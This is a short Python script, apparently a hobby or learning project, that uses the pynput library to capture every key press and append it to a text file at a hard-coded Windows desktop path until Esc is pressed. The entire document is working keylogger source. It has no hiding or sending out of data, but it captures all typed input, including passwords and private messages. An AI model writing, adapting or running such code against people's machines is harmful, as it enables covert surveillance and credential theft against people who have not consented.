import pyautogui as pagui
import pynput

keylogger_txt = open(r"C:\Users\msher\Desktop\Desktop\CyberFowl\keylogger.txt", "w")
keylogger_txt.write(" ")
keylogger_txt.close()
keylogger_txt = open(r"C:\Users\msher\Desktop\Desktop\CyberFowl\keylogger.txt", "a")

def on_press(key):
    global key_cache, new
    string = "{0}".format(key)
    keylogger_txt.write(f"{string}\n")

def on_release(key):
    if key == pynput.keyboard.Key.esc: #Stop Listener
        return False    

# Collect events until released
with pynput.keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()